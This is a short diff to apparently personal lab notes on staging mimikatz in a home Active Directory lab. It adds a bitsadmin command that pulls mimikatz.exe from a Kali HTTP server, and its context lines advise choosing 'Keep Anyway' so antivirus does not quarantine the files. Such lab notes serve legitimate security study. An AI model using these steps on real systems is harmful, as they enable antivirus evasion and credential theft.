@@ -17,6 +17,8 @@ Or
 - From Edge browser in SPIDERMAN (Domain joined host)
 	- navigate to Kali IP address and find mimikatz files
 	- click on the four mimikatz files from x64 folder previously downloaded. Make sure Keep & Keep Anyway actions are selected so AV does not quarantine. They will be in Downloads folder.
+- Or from PS cmd line:
+	- `PS C:\htb> bitsadmin /transfer wcb /priority foreground http://192.168.95.130:8000/mimikatz.exe C:\Users\administrator\Downloads\mimikatz.exe`
 
 Step 3: Run `mimikatz.exe`
 - Run CMD as Administrator, navigate to Downloads folder, run `mimikatz.exe`
